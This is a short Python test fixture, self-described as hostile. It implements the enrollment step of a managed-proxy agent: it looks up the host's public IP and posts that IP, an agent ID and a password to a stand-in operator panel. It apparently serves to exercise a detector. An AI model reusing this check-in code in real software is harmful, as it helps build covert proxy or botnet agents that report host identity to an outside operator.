"""Panel enrollment client (hostile fixture).

Minimal managed-proxy enrollment shape: discovers the host's public IP,
then enrolls with the operator panel, sending a credential and host
identity in the registration payload. Deliberately has no SOCKS relay so
it isolates the enrollment composite from the relay composite.
"""
import requests

PANEL = "https://panel.example.invalid"


def enroll(agent_id, password):
    try:
        public_ip = requests.get(
            "https://api.ipify.org?format=json", timeout=5
        ).json().get("ip")
    except Exception:
        public_ip = None
    payload = {
        "agent_id": agent_id,
        "password": password,
        "client_ip": public_ip,
        "status": "active",
    }
    resp = requests.post(PANEL + "/api/register", json=payload, timeout=10)
    return resp.status_code == 200
